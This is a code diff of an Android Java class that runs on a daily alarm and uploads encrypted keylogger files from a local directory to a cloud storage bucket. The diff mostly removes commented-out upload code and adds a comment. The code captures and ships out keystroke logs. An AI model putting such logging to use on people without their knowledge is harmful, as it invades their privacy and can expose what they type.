@@ -23,6 +23,7 @@ import javax.crypto.NoSuchPaddingException;
 
 /**
  * Created by gwicks on 30/05/2018.
+ * Upload the key logger files every day
  */
 
 public class KeyloggerUploadAlarm extends BroadcastReceiver {
@@ -80,26 +81,10 @@ public class KeyloggerUploadAlarm extends BroadcastReceiver {
             }catch (Exception e){
                 Log.d(TAG, "onReceive: error deleting: " + e);
             }
-
         }
 
         ArrayList<File> encryptedFiles = new ArrayList<>(Arrays.asList(directory.listFiles()));
-
-
         Util.uploadFilesToBucket(encryptedFiles, true,logUploadCallback, mContext, folder);
-
-        //DELETING FILE BEFORE UPLOAD COMPLETE!!!!
-
-//        for(File each : encryptedFiles){
-//            Log.d(TAG, "onReceive: encrypted file to be uploaded: " + each.getAbsolutePath());
-//            beginUpload2("MicRecord_" +formattedDate, each.getAbsolutePath());
-//            try{
-//                each.delete();
-//            }catch (Exception e){
-//                Log.d(TAG, "onReceive: error deleting: " + e);
-//            }
-//        }
-
 
     }
 
@@ -137,26 +122,6 @@ public class KeyloggerUploadAlarm extends BroadcastReceiver {
 
     }
 
-//    private void beginUpload2(String name, String filePath) {
-//        Log.d(TAG, "beginUpload2: start of beginupload2");
-//        Log.d(TAG, "beginUpload2: the filepath is: " + filePath);
-//        if (filePath == null) {
-//            //Toast.makeText(this, "Could not find the filepath of the selected file", Toast.LENGTH_LONG).show();
-//            Log.d(TAG, "beginUpload2: no file path found");
-//            return;
-//        }
-//
-//
-//        Log.d(TAG, "beginUpload2: middle");
-//
-//        File file = new File(filePath);
-//        Log.d(TAG, "beginUpload2: after new file");
-//        //TransferObserver observer = transferUtility.upload(Constants.BUCKET_NAME, name,
-//        mTransferUtility.upload(Constants.BUCKET_NAME, name,
-//                file);
-//        Log.d(TAG, "beginUpload2: end");
-//
-//    }
 
     final Util.FileTransferCallback logUploadCallback = new Util.FileTransferCallback() {
         @SuppressLint("DefaultLocale")
